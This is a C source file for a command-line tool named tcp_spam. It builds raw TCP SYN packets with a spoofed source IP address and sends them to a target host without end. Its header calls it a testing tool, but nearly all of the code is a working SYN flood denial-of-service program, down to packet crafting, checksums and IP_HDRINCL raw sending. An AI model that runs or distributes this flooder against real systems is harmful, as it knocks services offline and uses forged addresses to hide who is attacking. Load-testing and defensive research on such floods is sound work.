/* =====================================================================================
 *
 *       Filename:  tcp_spam.c
 *
 *    Description:  A traffic injection tool for testing. This tool spams TCP SYNs to a 
 *                  specified host on a specified port as a specified source_ip
 *                  usage:
 *                          ./tcp_spam -p <port> -h <hostname> -s <source_ip> 
 *
 *        Version:  1.0
 *        Created:  06/01/2018 07:36:49 PM
 *       Revision:  1.0
 *       Compiler:  gcc
 *
 *         Author:  Luke Cesarz (lc), htonl (git)
 *        Address:  Minneapolis MN
 *
 * =====================================================================================
 * This software comes with no warrenties. It is free to use and copy. Any use
 * of this software in an illegal way, is not the responsibility of the
 * original author. 
 */

#include <stdio.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/tcp.h>
#include <netinet/ip.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <strings.h>
#include <string.h>
#include <fcntl.h>
#include <stdlib.h>
#include <errno.h>

/* * * * * * * * * * * * * * * * * * * * * * * * * * *
 * Opens a socket for TCP
 * * * * * * * * * * * * * * * * * * * * * * * * * * *
*/
struct csum_hdr
{
	unsigned int source_addr;
	unsigned int dest_addr;
	unsigned char placeholder;
	unsigned char protocol;
	unsigned short tcp_length;

	struct tcphdr tcp;
};

/* * * * * * * * * * * * * * * * * * * * * * * * * * * * *
 * Simple checksum implementation
 * * * * * * * * * * * * * * * * * * * * * * * * * * * * *
*/
unsigned short csum(unsigned short *ptr,int nbytes) 
{
    register long sum;
    unsigned short oddbyte;
    register short answer;
 
    sum=0;
    while(nbytes>1) {
        sum+=*ptr++;
        nbytes-=2;
    }
    if(nbytes==1) {
        oddbyte=0;
        *((u_char*)&oddbyte)=*(u_char*)ptr;
        sum+=oddbyte;
    }
 
    sum = (sum>>16)+(sum & 0xffff);
    sum = sum + (sum>>16);
    answer=(short)~sum;
     
    return(answer);
}
/* * * * * * * * * * * * * * * * * * * * * * * * * * *
 * Opens a socket for TCP
 * * * * * * * * * * * * * * * * * * * * * * * * * * *
*/
int get_sock_fd()
{
    int fd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);

    if(fd < 0) {
        perror("cannot open socket");
        return -1;
    }
    return fd;
}

/* * * * * * * * * * * * * * * * * * * * * * * * * * *
 * Configure the socket
 * * * * * * * * * * * * * * * * * * * * * * * * * * *
*/
struct sockaddr_in configure_sock(int port, char *hostname)
{
    struct sockaddr_in servaddr;

    bzero(&servaddr,sizeof(servaddr));
    servaddr.sin_family = AF_INET;
    servaddr.sin_addr.s_addr = inet_addr(hostname);
    servaddr.sin_port = htons(port);

    return servaddr;
}
/* * * * * * * * * * * * * * * * * * * * * * * * * * *
 * Configure the packet
 * * * * * * * * * * * * * * * * * * * * * * * * * * *
*/
struct iphdr* configure_packet(char* source_ip, char* datagram, struct sockaddr_in sin)
{
    struct iphdr* iph = (struct iphdr *) datagram;
    struct tcphdr *tcph = (struct tcphdr *) (datagram + sizeof (struct ip));
	struct csum_hdr psh;
	

    //fill in the IP header
    iph->ihl = 5;
    iph->version = 4;
    iph->tos = 0;
    iph->tot_len = sizeof (struct ip) + sizeof (struct tcphdr);
    iph->id = htons(54321);  //Id of this packet
    iph->frag_off = 0;
    iph->ttl = 255;
    iph->protocol = IPPROTO_TCP;
    iph->check = 0;      //Set to 0 before calculating checksum
    iph->saddr = inet_addr ( source_ip );    //Spoof the source ip address
    iph->daddr = sin.sin_addr.s_addr;
     
    iph->check = csum ((unsigned short *) datagram, iph->tot_len >> 1);
     
    //TCP Header
    tcph->source = htons (1234);
    tcph->dest = htons (80);
    tcph->seq = 0;
    tcph->ack_seq = 0;
    tcph->doff = 5;      /* first and only tcp segment */
    tcph->fin=0;
    tcph->syn=1;
    tcph->rst=0;
    tcph->psh=0;
    tcph->ack=0;
    tcph->urg=0;
    tcph->window = htons (5840); /* maximum allowed window size */
    tcph->check = 0;/* if you set a checksum to zero, your kernel's IP stack
                should fill in the correct checksum during transmission */
    tcph->urg_ptr = 0;
    //Now the IP checksum
     
    psh.source_addr = inet_addr( source_ip );
    psh.dest_addr = sin.sin_addr.s_addr;
    psh.placeholder = 0;
    psh.protocol = IPPROTO_TCP;
    psh.tcp_length = htons(20);
     
    memcpy(&psh.tcp , tcph , sizeof (struct tcphdr));
     
    tcph->check = csum( (unsigned short*) &psh , sizeof (struct csum_hdr)); 
    return iph;
}

/* * * * * * * * * * * * * * * * * * * * * * * * * * *
 * Sends the TCP packet
 * * * * * * * * * * * * * * * * * * * * * * * * * * *
*/
int tcp_send(char *datagram, int sfd, struct sockaddr_in servaddr, struct iphdr* iph)
{
    if (sendto(sfd, datagram, iph->tot_len, 0, (struct sockaddr *)&servaddr, sizeof(servaddr)) < 0){
        perror("cannot send message");
        return -1;
    }
}

/* * * * * * * * * * * * * * * * * * * * * * * * * * *
 * quick check for all the args, print usage if
 * something is wrong
 * * * * * * * * * * * * * * * * * * * * * * * * * * *
*/
int check_args(char* hostname, int port, char* source_ip)
{
    if (!*hostname) {
        printf ("usage: -p port -h hostname -s source_ip\n");
        return -1;
    }
    if (!port) {
        printf ("usage: -p port -h hostname -s source_ip\n");
        return -1;
    }
    if (!*source_ip) {
        printf ("usage: -p port -h hostname -s source_ip\n");
        return -1;
    }
    return 0;
}

/* * * * * * * * * * * * * * * * * * * * * * * * * * *
 * Parse Args and start the loop
 * * * * * * * * * * * * * * * * * * * * * * * * * * *
*/
int main(int argc, char* argv[])
{
    int port = 0, n = 1, sfd;
    struct sockaddr_in servaddr;
    char datagram[4096];
    char hostname[1024];
    char source_ip[32];
    short h;
    short m;

    //initialize the buffers to 0
	bzero(datagram,sizeof(datagram));
    bzero(hostname, sizeof(hostname));
    bzero(source_ip, sizeof(source_ip));

    if (argc != 7) {
        printf ("usage: -p port -h hostname -s source_ip\n");
        printf ("Wrong number of args\n");
        return -1;
    }
    //Arg parsing
    for (int i = 0; i < argc; i++) {
        if (!strcmp(argv[i],"-p")) {
            port = atoi(argv[i + 1]);
        }
        else if (!strcmp(argv[i],"-h")) {
            strncpy(hostname, argv[i + 1], sizeof(hostname));
        }
        else if (!strcmp(argv[i], "-s")) {
            strncpy(source_ip, argv[i + 1], sizeof(source_ip));
        }
    }
    if (check_args(hostname, port, source_ip)) { 
        return -1;
    }
    printf("Starting...\n");
    printf("port: %d, host: %s, source_ip: %s\n",port,hostname,source_ip);
    
    //create the UDP socket
    sfd = get_sock_fd();
    //configure the socket
    servaddr = configure_sock(port, hostname);
    //create the ip header
    struct iphdr* iph = configure_packet(source_ip, datagram, servaddr);
    
    int one = 1;
    const int *val = &one;
    if (setsockopt (sfd, IPPROTO_IP, IP_HDRINCL, val, sizeof (one)) < 0) {
        printf("Error setting IP_HDRINCL. Err : %d . Error msg: %s\n", errno, strerror(errno));
        exit(0);
    }
    //start spamming
    while(1) {
        tcp_send(datagram, sfd, servaddr, iph);
        if (n++ == 1000000) {
            printf("1000000 more packets\n");
            n=0;
        }
    }
    close(sfd);
    return 0;
}

